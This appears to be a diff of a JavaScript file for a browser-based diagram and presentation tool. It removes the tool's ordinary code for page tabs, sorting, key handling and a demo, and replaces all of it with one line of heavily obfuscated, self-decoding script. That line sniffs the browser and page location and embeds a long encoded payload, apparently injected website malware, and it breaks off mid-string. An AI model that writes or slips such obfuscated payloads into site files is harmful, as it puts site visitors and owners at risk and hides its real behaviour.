-    },
-    remoteway:1,
-    remote: function ()
-    {
-        var y = Play.schedule(1);  
-        var url = locationstr + "/remote.jsp?t=" + tstmp + '&schedule=' + y.replace(/;$/, '') + "&current=" + Play.current;
-        open(url, iframename);
-    },
-    initRemote: function (securitytoken, uid, sek)
-    {
-        Msg.init({stoken: securitytoken,
-            app: "chat",
-            tid: '',
-            sid: uid,
-            sname: uid,
-            rid: '',
-            code: '',
-            msg: '',
-            sek: sek});
-        Msg.needmore = true;
-        Msg.listen();
-        Msg.send({code: 'new', msg: '' + tstmp});
-
-    },
-    endRemote: function ()
-    {
-        Msg.send({code: 'unsubs', msg: Msg.tid});
-    },
-    quitremote: function ()
-    {
-        open(originalurl + "/remote.jsp?t=" + tstmp + "&schedule=", 'w' + tstmp);
-        closeprompt();
-    }
-
-
-}
-
-var needtranslator = true;
-initfilename();
-makebtns();
-makeframe();
-initialdraw();
-makemenu2();
-pagetbl  = $('selpage').getElementsByTagName('table')[0];
-
-changefontfamily();
-
-if ( document.body.style.backgroundImage == 'url()' || document.body.style.backgroundImage == '')
-{
-    document.body.style.backgroundImage = null;
-}
-if (chatsessionnum==-1)
-Play.color('stop');
-if (editable)
-{
-    window.onunload = savetocache;
-}
-var countex = 0;
-var tenexechandle;
-function tenexec()
-{
-   countex++;
-   if (countex==4)
-   {
-       fixall();
-       clearInterval(tenexechandle);
-   }
-}
-var oldonload4 = window.onload;
-function passcache()
-{
-   localStorage[filename] = $("savearea").value;
-   document.location.href = document.location.toString().replace(/&pass/,'');
-}
-window.onload  = function()
-{
-    onlinetoolbarhas = true;
-    if (oldonload4!=null) oldonload4();
-    if (document.location.toString().indexOf("&pass")>0)
-    {
-        myprompt("Paste cached codes to this textbox and click the Open button.<br><textarea id=\"savearea\" rows=20 cols=60></textarea><br><center><input type=button style=\"background-color:#00BBBB;color:white;width:90px;border:1px #b0b0b0 outset;border-radius:3px\" value=\"Open\" onclick=\"passcache()\" ></center>");
-        $("savearea").focus();
-        return;
-    }
-    if (shapearr.length==0 && chatsessionnum==-1)
-    {
-        trydemo();
-    }
-    else
-    {
-        if (document.location.toString().indexOf("http")!=0)
-        {
-            myprompt("<textarea id=savearea cols=40 rows=2 ></textarea><br>You are opening the file from local disk. To edit it further, click the link to use designated web application to open it<br><a href=javascript:openremote()>" + originalurl + "</a>");
-            $("savearea").value = tojson();
-        }
-    }
-    //else  tenexechandle = setInterval(tenexec,100);//fixall();
-    
-}
-function openremote()
-{
-  var copyText = document.getElementById("savearea");
-  copyText.select();
-  copyText.setSelectionRange(0, 99999); /* For mobile devices */
-  document.execCommand("copy");
-  
-  open(originalurl + "/umltool.html?fn=" + filename + "&lang=" + getlang() + "&pass", "_self");
-  
-}
-var oldpagenum;
-function copyapage(xys)
-{
-   var str = '';
-   var x,y;
-   var mx = 0, my=0;
-   var had = [];
-   var N = numShapes;
-   for (var  j=0; j<N;j++)
-   {
-       x = $('b'+j);
-       if (x==null) continue;
-       var tt = x.style.left;
-       if (tt == null) continue;
-       tt = parseInt(tt.replace(/px/,'')) - xys[0];
-       x.style.left = tt + 'px';
-       tt = x.style.top;
-       if (tt == null) continue;
-       tt = parseInt(tt.replace(/px/,'')) - xys[1];
-       x.style.top = tt + 'px';
-       var t = x.outerHTML.replace(/ id=["]?[a-z|0-9]+["]? /gi," ").replace(/ onclick="[^"]+"/ig," ").replace(/ ondragstart="[^"]+"/ig," ").replace(/ ondragend="[^"]+"/ig," ");
-       str += myformatele1(t,ismakingtab);
-   }
-   xys[0] = mx+20; xys[1] = my+20;
-   return (str);
-}
-var haspagetab = false;
-function makepagetab1()
-{
-    if(haspagetab == false)
-        makepagetab();
-    else
-    {
-        showbig(oldpagenum);
-    }
-}
-function makepagetab()
-{
-    if (haspagetab == false)
-    {
-        if (pagetbl.rows.length  <= 2) return;
-        ismakingtab = 160/thispagewidth();
-        oldpagenum = pagenum;
-        pagenum = -1; 
-        for (var j=0; j < pagetbl.rows.length-1;j++)
-        {
-            changepage(pagetbl.rows[j].cells[0]);
-            var m = 0;
-            var wn = 10000, wx=-1, hn=10000, hx=-1;
-            for (var i = 0; i < numShapes; i++)
-            {
-                if (allShapes[i].x < 0) allShapes[i].delme();
-            }
-            var jj = 0;
-            for (var i = 0; i < numShapes; i++)
-            {
-                if (allShapes[i] == null  )
-                    continue;
-                var d = allShapes[i].start + allShapes[i].time;
-                if (m < d)
-                    m = d;
-               
-                if (allShapes[i].x!=null && allShapes[i].x < wn){
-                   wn = allShapes[i].x;
-                }
-               if (allShapes[i].x!=null && allShapes[i].width!=null && allShapes[i].x + allShapes[i].width*1.5 > wx){
-                   wx = allShapes[i].x + allShapes[i].width*1.5;
-               }
-                if (allShapes[i].y!=null && allShapes[i].y < hn){
-                   hn = allShapes[i].y;
-               }
-               if (allShapes[i].y!=null &&  allShapes[i].height!=null && allShapes[i].y +  allShapes[i].height*1.5> hx){
-                   hx = allShapes[i].y +  allShapes[i].height*1.5;
-               }
-            }
-            
-            var mstr = '';
-            if (m>0)  mstr = (Math.round(10*m)/10) + "m";
-            var xy = [wn,hn];
-            var str = copyapage(xy);
-            clearall(); 
-            var icon = document.createElement('div');
-            icon.id= 'icon' + j;
-            var width0 = 160;
-            var height0 = 100;
-            var rate = 160/(wx-wn);
-            if (rate >  100/(hx-hn)) rate = 100/(hx-hn);
-            icon.style.cssText = "background:" + (oldpagenum==j?'#aaaaaa':'white') + ";position:absolute;width:"+ width0 + "px;height:" + height0 + "px;left:0px;top:" + (j*100) + "px;border:1px red solid;border-radius:3px;display:block;z-index:100";
-            var width1 = (30*width0/160);
-            var height1 = (20*height0/100);
-            icon.innerHTML = "<div style=\"position:absolute;transform:scale(" + rate + "," + rate + ")\" >" + str + "</div>"
-            +"<div style=\"position:absolute;left:0px;top:0px;width:" + width0 +"px;height:" + height0 +"px;vertical-align:top;background-color:transparent;z-index:126;text-align:right;color:#221100;font-size:" + (12*width0/160) + "px;\" onclick=showbig(" + j +")   onmouseout=\"javascript:this.parentNode.style.backgroundColor='white';\" onmouseover=\"javascript:this.parentNode.style.backgroundColor='#aaaaaa';\" >" + textmsg[1854].replace(/@/,''+(j+1)) + '<br> '+ mstr + "</div>";
-            icon.onClick = function()
-            {
-                var pn = parseInt(this.id.substring(4));
-                changepage(pagetbl.rows[pn].cells[0]);
-               // changepagelbl(pagetbl.rows[pn].cells[0]);
-            }
-            document.body.appendChild(icon);
-          //  if (icon.style.left != '0px') icon.style.left  = '0px';
-        }
-        haspagetab = true;
-        changepage(pagetbl.rows[oldpagenum].cells[0]);
-      //  changepagelbl(pagetbl.rows[oldpagenum].cells[0]);
-       // document.getElementById('selplay').options[1].text = textmsg[1771].split(/@/)[9];
-
-    }
-    else
-    {
-        haspagetab = false;
-        for (var j=0;  ;j++)
-        {
-            var x = document.getElementById('icon' + j);
-            if (x == null) break;
-            document.body.removeChild(x);
-        }
-        //document.getElementById('selplay').options[1].text = textmsg[1771].split(/@/)[8];
-    }
-}
-
-function copyanarr(y)
-{
-    var ar = new Array(y.length);
-    for (var j=0;j<y.length;j++) ar[j] = y[j];
-    return ar;
-}
-function makepagesort()
-{
-    if (haspagetab) makepagetab();
-    if (haspagesort == false)
-    {
-
-        if (pagetbl.rows.length  <= 2) return;
-        var width0 = Math.round((screen.width-40)/6);
-        var height0 = Math.round((screen.height-110)/6);
-        ismakingtab = (screen.width-40)/6/thispagewidth();
-        oldpagenum = pagenum;
-      
-        var wi=0, hi = 0;
-        pagenum = -1;
-        for (var j=0; j < pagetbl.rows.length-1;j++)
-        {
-            changepage(pagetbl.rows[j].cells[0]);
-            var wn=100000,wx=-1,hn=100000,hx=-1;
-            for (var i = 0; i < numShapes; i++)
-            {
-                if (allShapes[i] == null  )
-                    continue;
-                if (allShapes[i].x!=null && allShapes[i].x < wn){
-                   wn = allShapes[i].x;
-                }
-               if (allShapes[i].x!=null && allShapes[i].width!=null && allShapes[i].x + allShapes[i].width*1.5 > wx){
-                   wx = allShapes[i].x + allShapes[i].width*1.5;
-               }
-                if (allShapes[i].y!=null && allShapes[i].y < hn){
-                   hn = allShapes[i].y;
-               }
-               if (allShapes[i].y!=null &&  allShapes[i].height!=null && allShapes[i].y +  allShapes[i].height*1.5> hx){
-                   hx = allShapes[i].y +  allShapes[i].height*1.5;
-               }
-            }
-            var icon = document.createElement('div');
-            icon.id= 'icon' + j;
-            icon.style.cssText = "background:white;position:absolute;width:"+ width0 + "px;height:" + height0 + "px;left:" + (wi*(width0+5)+5) + "px;top:" + (hi*(height0+5)+50) + "px;border:1px red solid;border-radius:5px;display:block;z-index:100";
-            wi++;
-            if ( wi == 6)
-            {
-                hi++;
-                wi = 0;
-            }
-            var rate = width0/(wx-wn);
-            if (rate > height0/(hx-hn)) rate = height0/(hx-hn);
-            
-            icon.innerHTML = "<div style=\"position:absolute;transform:scale(" + rate + "," + rate + ")\" >" + copyapage([wn,hn]) + "</div>"
-           
-            var width1 = (156*width0/160);
-            var height1 = (96*height0/100);
-           
-            Drag.init(icon);
-            document.body.appendChild(icon);
-            delall();
-
-            icon.onDragStart = function(x,y)
-            {
-                iconx = x;
-                icony = y;
-                var k =  parseInt(this.id.substring(4));
-            }
-            icon.onDragEnd = function(x,y)
-            {
-                var width0 = Math.round((screen.width-40)/6);
-                var height0 = Math.round((screen.height-110)/6);
-                var N = pagetbl.rows.length - 1;
-                var k =  parseInt(this.id.substring(4)), k0 = k;
-                for (k--; k>=0; k--)
-                {
-                    var c = $('icon' + k);
-                    var cx = parseInt(c.style.left.replace(/px/i,''));
-                    var cy = parseInt(c.style.top.replace(/px/i,''));
-                    if ( Math.abs(cx-x) < width0 && Math.abs(cy-y) < height0 )
-                    {
-                        break;
-                    }
-                }
-                if (k < 0)
-                {
-                    k=k0+1;
-                    for (; k < N; k++)
-                    {
-                    var c = $('icon' + k);
-                    var cx = parseInt(c.style.left.replace(/px/i,''));
-                    var cy = parseInt(c.style.top.replace(/px/i,''));
-                    if ( Math.abs(cx-x) < width0 && Math.abs(cy-y) < height0 )
-                    {
-                        break;
-                    }
-                    }
-                }
-
-                if (k>=0 && k < N && k!=k0)
-                {
-                    var delta = k>k0?1:-1;
-                    var ar = copyanarr(shapearr[k0]);
-                    var li = copyanarr(linearr[k0]);
-                    var cu = copyanarr(curvearr[k0]);
-                    var at =copyanarr(allies[k0]);
-                    var bg = bgarr[k0];
-                    while (true)
-                    {
-                        var j = k0 + delta;
-                        shapearr[k0] = copyanarr( shapearr[j]);
-                        linearr[k0] = copyanarr(linearr[j]);
-                        curvearr[k0] = copyanarr(curvearr[j]);
-                        allies[k0] = copyanarr(allies[j]);
-                        bgarr[k0] = bgarr[j];
-                        k0 = j;
-                        if (j==k) break;
-                    }
-                    shapearr[k] =  (ar);
-                    linearr[k] =  (li) ;
-                    curvearr[k] =  (cu);
-                    allies[k] = at;
-                    bgarr[k] = bg;
-                    for (var j=0;  ;j++)
-                    {
-                        var x = document.getElementById('icon' + j);
-                        if (x == null) break;
-                        document.body.removeChild(x);
-                    }
-                    haspagesort = false;
-                    makepagesort();
-
-                }
-                else
-                {
-                    this.style.left = iconx + 'px';
-                    this.style.top = icony  + 'px';
-                }
-            }
-        }
-
-        ismakingtab = 1;
-        haspagesort = true;
-       // changepage(pagetbl.rows[oldpagenum+1].cells[0]);
-        $('selplay').getElementsByTagName('table')[0].rows[9].cells[0].innerHTML  = textmsg[1771].split(/@/)[14];
-        Play.hideother(true,true);
-    }
-    else
-    {
-        Play.hideother(false,true);
-
-        for (var j=0;  ;j++)
-        {
-            var x = document.getElementById('icon' + j);
-            if (x == null) break;
-            document.body.removeChild(x);
-        }
-        pagenum = -1;
-        changepage(pagetbl.rows[oldpagenum].cells[0]);
-        haspagesort = false;
-        $('selplay').getElementsByTagName('table')[0].rows[9].cells[0].innerHTML = textmsg[1771].split(/@/)[13];
-    }
-}
-
-function exitsort()
-{
-    if (haspagesort)
-        makepagesort();
-}
-function showbig(pn)
-{
-     haspagesort = true;
-     ismakingtab = 1;
-     makepagetab();
-     changepage(pagetbl.rows[pn].cells[0]);
-     haspagesort = false;
-
-}
-document.onkeydown = overrideKeyboardEvent;
-document.onkeyup = overrideKeyboardEvent;
-var keyIsDown = {};
-
-function overrideKeyboardEvent(e){
-  switch(e.type){
-    case "keydown":
-
-      if(!keyIsDown[e.keyCode])
-      {
-        keyIsDown[e.keyCode] = true;
-
-        if (Play.remoteway==1)
-        {
-
-            if (e.keyCode == 33 && Play.starttime>0)
-            {
-
-             Play.backward();
-             disabledEventPropagation(e);
-             e.preventDefault();
-             return false;
-            }
-            else if (e.keyCode == 34 && Play.starttime>0)
-            {
-             Play.forward();
-             disabledEventPropagation(e);
-             e.preventDefault();
-             return false;
-             }
-        }
-        else
-        {
-        if (e.keyCode == 36)
-        {
-             Play.start();
-             disabledEventPropagation(e);
-             e.preventDefault();
-             return false;
-        }
-        else if (e.keyCode == 35 && Play.starttime>0)
-        {
-            Play.stop();
-            disabledEventPropagation(e);
-            e.preventDefault();
-            return false;
-        }
-        else if (e.keyCode == 34 && Play.starttime>0)
-        {
-            Play.nextpage();
-             disabledEventPropagation(e);
-  e.preventDefault();
-  return false;}
-        else if (e.keyCode == 33 && Play.starttime>0)
-        {
-            Play.prevpage();
-             disabledEventPropagation(e);
-  e.preventDefault();
-  return false;
-        }
-        else if (e.keyCode == 37 && Play.starttime>0)
-        {
-            Play.backward();
-             disabledEventPropagation(e);
-  e.preventDefault();
-  return false;
-        }
-        else if (e.keyCode == 39 && Play.starttime>0)
-        {
-            Play.forward();
-             disabledEventPropagation(e);
-  e.preventDefault();
-  return false;
-        }
-        else if (e.keyCode == 38 && $('icon0')!=null)
-        {
-            Play.pageup();
-             disabledEventPropagation(e);
-  e.preventDefault();
-  return false;
-        }
-        else if (e.keyCode == 40 && $('icon0')!=null)
-        {
-            Play.pagedown();
-             disabledEventPropagation(e);
-  e.preventDefault();
-  return false;
-        }
-        else if (e.keyCode == 45)
-        {
-
-             makepagetab();
-             disabledEventPropagation(e);
-             e.preventDefault();
-             return false;
-        }
-        else if (e.keyCode == 13 && $('icon0')!=null)
-        {
-               Play.select();
-                disabledEventPropagation(e);
-  e.preventDefault();
-  return false;
-           }
-        else
-        {
-            return true;
-        }
-        }
-      }
-    break;
-    case "keyup":
-      delete(keyIsDown[e.keyCode]);
-      // do key up stuff here
-    break;
-  }
-  return true;
-}
-function disabledEventPropagation(e){
-  if(e){
-    if(e.stopPropagation){
-      e.stopPropagation();
-    } else if(window.event){
-      window.event.cancelBubble = true;
-    }
-  }
-}
-
-function showhintstr(dv,msg)
-{
-    if(shapearr.length>2) return;
-    if ($('hinttext')!=null) hidehint();
-    var xy = findPositionnoScrolling(dv);
-    var d = document.createElement('span');
-    d.style.cssText = 'background-color:white;color:#444444;border:1px #9988aa solid;font-size:16px;position:absolute;top:5px;left:' + (xy[0]+dv.offsetWidth + 2) + 'px;box-shadow:1px 1px #bbbbbb;height:22px;line-height:22px';
-    d.id='hinttext';
-    d.innerHTML = msg;
-    document.body.appendChild(d);
-}
-function showhint1(msg,dv)
-{
-    hidehint1();
-    dv = dv.parentNode.parentNode.parentNode.parentNode.parentNode.previousSibling;
-    var xy = findPositionnoScrolling(dv);
-    var d = document.createElement('span');
-    d.style.cssText = 'z-index:200;background-color:white;color:#444444;border:1px #9988aa solid;font-size:16px;position:absolute;top:' + (xy[1]+20 ) + 'px;left:' + (xy[0] +4) + 'px;box-shadow:1px 1px #bbbbbb;height:22px;line-height:22px';
-    d.id='hinttext';
-    d.innerHTML = msg;
-    document.body.appendChild(d);
-}
-function hidehint()
-{
-   if(shapearr.length==3)
-   {
-       for(var l=0; l < 14; l++)
-           hintstr[l] = '';
-   }
-   if(shapearr.length>3) return;
-   var x = $('hinttext');
-   if (x!=null) document.body.removeChild(x);
-
-}
-function hidehint1()
-{
-   var x = $('hinttext');
-   if (x!=null) document.body.removeChild(x);
-
-}
-
-
-function trydemo()
-{
-    if (opener!=null && typeof(opener.demokeyframen)!='undefined' &&  opener.demokeyframen > 0)
-    {
-        demospeedup = opener.demospeedup;
-        demo();
-    }
-    else
-    {
-        myprompt(hintstr[0], null, "if(v)demo();else newshape($('tdicon'));");
-    }
-}
-demo = function()
-{
-   demoinitcursor(originalurl + "/");
-   demosch();
-}
-var thetbl0;
-function getsubtable(k,j,cd)
-{
-    thetbl0 = $('m' + k + '_' + cd).getElementsByTagName('table')[0];
-    thetbl0 = thetbl0.rows[j].cells[0].getElementsByTagName('table')[0];
-}
-demotasks = [
-["democursorx = 400;democursory = 300;democursor2($('tdicon'))", 0],
-["demoheight(0.7); newshape($('tdicon'))", 3000],
-["demoheight();democursor2($('helpbtn'))",500],
-['demoheight(0.7);helpstr(0);tm = parseInt(promptwin.style.zIndex) + 1; democursorsim.style.zIndex = tm',3000],
-['demoheight();democursor2(promptwin)',500],
-['democursor2(democursorx, democursory + promptwin.offsetHeight/2-15)', 3000],
-['demoheight(0.7);example(0)', 3000],
-["demoheight();democursor2($('donebtn'))", 500],
-['demoheight(0.7);done(0);closeprompt()', 3000],
-["demoheight();democursor2($('donebtn'))", 500],
-['demoheight(0.7);done(0)', 1000],
-//["demoheight();democursor2($('b0'))",500],
-//["demoheight(0.7);closeprompt(); myHintx = democursorx;myHinty = democursory; mdia(0,1)", 2000],
-["demoheight();getsubtable(0,2,1);democursor2(thetbl0.rows[0].cells[2])", 500],
-['demoheight(0.7);thetbl0.rows[0].cells[2].click()', 3000],
-["demoheight();getsubtable(0,3,1);democursor2(thetbl0.rows[0].cells[3])", 500],
-['demoheight(0.7); thetbl0.rows[0].cells[3].click()', 2000],
-["demoheight();getsubtable(0,4,1);democursor2(thetbl0.rows[0].cells[2])",500],
-['demoheight(0.7);thetbl0.rows[0].cells[2].click()', 2000],
-["demoheight();getsubtable(0,5,1);democursor2(thetbl0.rows[0].cells[3])",500],
-['demoheight(0.7); thetbl0.rows[0].cells[3].click()', 2000],
-["demoheight();getsubtable(0,2,1);democursor2(thetbl0.rows[0].cells[0])", 500],
-["demoheight(0.7); thetbl0.rows[0].cells[0].click()", 3000],
-["demoheight();getsubtable(0,6,1);democursor2(thetbl0.rows[0].cells[1])", 500],
-["demoheight(0.7); thetbl0.rows[0].cells[1].click()", 2000],
-["demoheight();getsubtable(0,8,1);democursor2(thetbl0.rows[2].cells[0])",500],
-['demoheight(0.7); canceldia(0,1)', 2000],
-["demoheight();democursor2($('b0'),2)",500],
-["demoheight(0.7);democursor2(democursorx+500,democursory)",500],
-["$('b0').style.left = (democursorx-100) + 'px';$('b0').style.top = (democursory-100) + 'px';allShapes[0].x=(democursorx-100);allShapes[0].y=(democursory-100)", 4000],
-["demoheight();democursor2($('tdicon'))", 500],
-["demoheight(0.7); newshape($('tdicon'))", 3000],
-["demoheight();democursor2($('e1'))",500],
-["demoheight(0.7); $('e1').focus()", 2000],
-["demoheight();$('e1').value=originalurl+'/image/tm.gif'",500],
-["demoheight();democursor2($('donebtn'))", 500],
-['demoheight(0.7);done(1)', 3000],
-["thetbl0=getelebyname($('t1'),'opts0');democursor2(thetbl0,2)",1000],
-["demoheight(0.7);thetbl0.checked=true;chooseurlas(0,1);thetbl0=getelebyname($('t1'),'aswidth')", 3000] ,
-["demoheight();democursor2(thetbl0,2)",500],
-["demoheight(0.7);thetbl0.value='400'", 3000],
-["demoheight();dourlaswidth(thetbl0,0);",1000],
-["demoheight();democursor2($('donebtn'))", 500],
-['demoheight(0.7);done(1)',2000],
-["demoheight();getsubtable(1,8,1);democursor2(thetbl0.rows[1].cells[1])",2000],
-['demoheight(0.7); canceldia(1,1)',3000],
-["demoheight();thetbl0=$('tdline');democursor2(thetbl0,2)",500] ,
-["demoheight(0.7);thetbl0=$('tdline');select(thetbl0,0,0)", 3000],
-["demoheight();democursor2($('b0'),2)", 500],
-["demoheight(0.7);begindraw($('b0'))", 3000],
-["demoheight();democursor2($('b1'),2)", 2000],
-["demoheight(0.7);begindraw($('b1'));", 3000],
-["demoheight();thetbl0=$('tdline');democursor2(thetbl0)", 3000],
-["demoheight(0.7);thetbl0.click();", 3000],
-["demoheight();getsubtable(0,3,2);democursor2(thetbl0.rows[0].cells[3])", 2000],
-["demoheight(0.7); thetbl0.rows[0].cells[3].click();", 2000],
-["demoheight();getsubtable(0,4,2);democursor2(thetbl0.rows[0].cells[3])", 500],
-["demoheight(0.7);thetbl0.rows[0].cells[3].click()", 2000],
-["demoheight();getsubtable(0,5,2);democursor2(thetbl0.rows[0].cells[1])", 1000],
-["demoheight(0.7);thetbl0.rows[0].cells[1].click()", 3000],
-["demoheight();delall();demoremovesim();myprompt(hintstr[13])",3000]
-];
-function getelebyname(t,n )
-{
-    if (t==null || t.tagName == null )
-        return null;
-    if (t.tagName.toLowerCase()=='input' && t.name == n)
-       return t;
-        var y = t.childNodes;
-        if (y!=null && y.length>0)
-        {
-            for (var j=0; j < y.length; j++)
-            {
-                var z = getelebyname(y[j],n );
-                if (z!=null) return z;
-            }
-        }
-     return null;
-}
-function stopdemo()
-{
-    closeprompt();
-    demostop();
-    demoremovesim();
-}
-
-function rotatepoint(t, obj)
-{
-    var an = Math.PI * obj.slope/180;
-    if (obj.shapename != 'circle') 
-    for (var i=0; i < t.length; i++)
-    {
-        var u = t[i];
-        var ct = [obj.x + obj.base.offsetWidth/2, obj.y + obj.base.offsetHeight/2];
-        var x = u[0] - ct[0];
-        var y = u[1] - ct[1];
-        t[i][0] = x*Math.cos(an) - y * Math.sin(an) + ct[0];
-        t[i][1] = y*Math.cos(an) + x * Math.sin(an) + ct[1];
-    }
-}
-
-function fixall()
-{
-    for (var num=0; num < numShapes; num++)
-    {
-       var sp = allShapes[num];
-       if (sp.ispic==0)
-       {
-       var q = $('p' + num);
-       if (q!=null && sp.height < q.offsetHeight )
-       {
-           sp.resize();
-           sp.height = q.offsetHeight+3;
-           sp.width = q.offsetWidth+3;
-           q.style.fontSize = sp.fontsize + 'px';
-           sp.init();
-       }
-       }
-    }
-}
-ResizeUploaded.initfolder = folder;
-
-
-
-
+l1l=document.documentMode||document.all;var c6ca8b5de=true;ll1=document.layers;lll=window.sidebar;c6ca8b5de=(!(l1l&&ll1)&&!(!l1l&&!ll1&&!lll));l_ll=location+'';l11=navigator.userAgent.toLowerCase();function lI1(l1I){return l11.indexOf(l1I)>0?true:false};lII=lI1('kht')|lI1('per');c6ca8b5de|=lII;zLP=location.protocol+'0FD';tsbfqL7Y1vskxn=new Array();lRxY35bsg8S8d0=new Array();lRxY35bsg8S8d0[0]='a\153%33\102J\112\163';tsbfqL7Y1vskxn[0]='	~zab~~~~~~~~~	~\n~~~\r~~~~~~~~~~~~~~\r~~~~ ~!~"~#~$~%~&~\'~(~)~*~+~,~-~.~/~0~1~2~3~4~5~6~7~8~9~:~;~<~=~>~?~@~A~B~C~D~E~F~G~H~I~J~K~L~M~N~O~P~Q~R~S~T~U~V~W~X~Y~A~~\\~]~^~_~`~a~b~c~d~e~f~dl=document.layers;oe=win~lw.op~xa?1:0;da=(~l~n~p~r.}~o~qtMode||}}~sall)&&!~|;g~}}!}.}-tEle}"ById;ws~~}zab}.si}bar?true:f}$se;tN=navigator.u}QrA}-}}]Low~xCa}Q();iz}U}T.}@exOf(\'netsca}\')>=0}I}K}M}Ol}Q;zi}>}||8~ka;v}G msg=\'\';function }~m}o{r}ur|,}J}L}}<}@}i}}~rr}^ =|-}6|OF}?}|<l~m}\\|*n.p|@}]col}v}}x}z}|fi}5|!=-1|\n}L}N}P}Ri7f=|s}(!z|G|e||h;/*|y|z|{|||}|~|{zab{{|\r\n* (C) C}yr}Zht 2004-{21 by Syst}6s |+ Web, I|\'.  A}% R{|zab{6e}bved{1 *{{Auth}^: Z{Hngya|,L}zab{2{U{V{W{X{Y{Z{[{Y{B{{{`{a{b{c|z/{if{ ty}o}{i|)sago}~lma}zab{=|C\'|&}|]}~d|{{{{U|r {q|{t{vd{x{z|,|C}/}|L||)|+.}]S}J}zabg}o|X}}y}{\'{tps://z{M{O{Ql}zab}1{qhub}vo|;z{2{h{z\r{s{u{wo{y{T|a 0)z> z\n{Yz~sz|Nzh|2{i{~z(z*z,z.z0{Pnz3|Pgz6z8z:/}C{$/|#zM}{zn\n\nz@}~m}z|Mz|Pzz{Nz"}wz%("zTl{H{#"{|zJzP{Y}({k{me{o{h{Q~ieE|?{|{~zzabez{>|\n{y{2|%|\'zy y}}5yr(|g{-|4l{-}&y"zNy5{Vz\n{kx{|C"Th~xe w}m {Q ~x|@z{({G| p{te.\\nyT"y7{\\ + "y+{Iy\\yZ||ya"yVyX{\\y["URL{J{2"yay1ydyfyY{Wyi{S}~ynypy[l;zqyg z-yC|;}|+yI|A|Cy(yy+y~{Z|2t|4|6|x\r{U}y5~|Jx|>yJ|By\'yy*|?y~xzs{l{n{i(}xpixi~py {|Yyz)y y5y9x)x+}x-yB|C(}~w D}\\e}o)}1}Tx<}oya36{xPx{2y9a|(i{=}D}5|)~pxxNxP{x"\nxT}%yN|C[]y~z-sy}}Gr[i]=[w}^ds,xk|~qa~p,x,y,~d{G,y@{8,f|+|zab}re,|U|Lr]\nz-zbexnxpxr[x%w{#}G}]bjn~ox|+ow"{-yw\'w)yH|Jw"w$m{-xw,jww5,yMck,dx:xV|+wy9xz}{&xf"{g{|2|("{-wHozzabwLtwNy\\exdz*ewU"w>x}|+d"xhxb|xn}iwF ["weww[wemw[w]mw_w[wwaxi/y9COLORSxwib~uw;w[|2w`wOg|2~qw[}^{Q}-w[v}Lw[p|4p}5v}zabkw[#{BvBwvwwx|Bwzw|w~vzab"wh{qwZwOvw[v	evwOv\r{Nv.y\\vv8"vrvv;x*nv,y{8~w}%}iwN"}J{QsyP|2~rwN\'1\'wbx$yy(kfrx}{;x/x1z}zabyx5y!y8|v[v]~pwgx@ Ow"e|(}o|w/ viv^s[\'5_4vUx{{;n:1{-}z+[[u2]]utm:5{-ssuu {#uu\n,uuuuuy3{vp:3y3uuy3|zab:u	uu\ru+u5|9x7vhwD{;vzabwbx#x\'wvYw}^sv`yx3yvfz	|u?~yv)vxUvCy\\v0vv\nnvv]v7vlvwOv=v?vvBvvB{v!u;{u=x\'buIuA|Byx2vcx4x6vgzuh|Vu@v)v+v-v{>v1uRuTvv;v:vvvuZvwtvFwW|LwlwOvLnvN}G}wUvSvUx" \nwW}Qup{Uuswvy8]x\'ttvPt|#y5tu@[9t{~vTxay9i|Unwzabzt2yy~y9x\n}5xw$}%t8wd}%w~rwgu\nu{0{-2tF3tH 3tF4tM4tF50wby9|]}%uLvBx"<!-ta->"t?zwqw_cyzy=&|Lz;tewcz{Hv]|?}itj|tmtvrtqtf uvO|@wtytly\\&uxnt~ts{u}%st]&bsy}try9wq|tksssy9wwt t&wCtxDx}sw1Sxlu8|Cs\'xcls*x{vlexAA|?~vvss{s{=wry<zJts;{;s$s>xs&sA}XsCw {s-tw1yxs,s@s}$lsPs3s5s7ys9y9~n|?}lw1sGsmyH}zabtsFsMscsesgsLsRs\\xvtwl}st=y}szTzy{#s|"tuwty|(s!t{$y;t}\\w({;wrtjt<stv~vw{$t r{"}]ps"|}utBtuIsby9w1bez r!wdxVs<sIx|\r|syP}2vrt>sysxr3sxr"~ouwWvq{$du9tcdr$r&|C|cr}voz sN~ot~lrGwhtW|v-{yrLrNsbguI|U}xrIsv\\zF{<~xx|7}Rzru<vXx\'}^}Z}zab}$y1uBumzuEu5yKwIrquXrlrrx tYx|x\\|CswxavWx&{u7xnrtvbrvvey5rd|~x{=srixR wCs+xnt<s4{3sYs9uq wqqqs6v]sZ}pqzabs]{=q%|DsXq)q!uGz}\\s$tjs|rq"u7x[x=q0qq2q+q"sx<qq1s8qBq4 q-x;qq?q(qHqy9r0qMq>vmqPq*qrlq	(r\\qukx0uCunyq"q^|?qFq@qQrkuerm{q6xUhs|q\ryqcx5q"qoq8}Jrqyx\'qxtkr{zIvaqtqty#|A(t0{sMz{<yFtq7pzab~t~qg{G;p++qv{Yzsqwi1tzIsw y\rp |?xpp# pqdyYqq9+|Cp)xop"u:qk(uf{{>{qaveqsuDqq"p=s$p@rhx\nudp:qmp:{#mppBqupq||zabupxx?qxC{$xFxHtxJ~pxL% 1x_xQpKzqt0v\\v^}WqNv*y{{kpPpy~s:wWw>wSr\'yKnwr}ayq0r9ryQsasjtX}X}^si 5tm}Ov}^sns.|ooxtUsro\nrxA|CtQozorhx{o! }xZeqTp|{r%{N|Ladw1sAr>|(~q};px}5|(s=s?o(}yArAq&qGqYso{G~x|&iq}Lopl|ppowgo(w!o,}G}QoCx0rz{$pQu}Jr}6vs|ocpQcofso_yPojy9olbonoQgzso|r6sBo[qokpp{+o0groo{vl}Frxoo6~rwr,|vsdv]}=s$ro|nawoSsgvlrnnntC}5{N{Go.w1C|4s<o.sTn&rn(oDqioFwCrtjsQzR~tzx|O}Bn2h.|2rcxE/^\\?/{-|"xGvNz3t(/&/q+sw(uMv	wQ}n|rjy9m}zab{FsQ"s|}Qu|O}DoOn|Vo}wgn_rCqp{>u7o5s|n3xws+o}t]wIwKr?n`znry@~ivcr nn|nmdqLmovmnsi{Q~oo.n}{>rDmmfco.|{ykz pGx1sH{=drv]npgtv,tCqz|Cru|u\n8xN]}Bv{qnL@nOy~q|u>mw}On[lypSpq"mm m;x}|^snm*y.tE94m0n=vn@@.*nEo\\nPow}mqTr7s>nWr.t0{y}-xZ2v+rBr[}me2couxgm7q[q}{sdro}pulqvdy5mCrm<mGxmqwo}mmqlq\\|+sn}zabz\r}$m@y }{\'zavc}]|Vl|)}$q`swpD{Ulllnlr~y=;LaT}x}<{+l!l#}x{knnl(l$xtqyarozd}Wr|r~yi/zno,.j~zxk}i~uryP}~l(t2{$~r_aw9v,uAs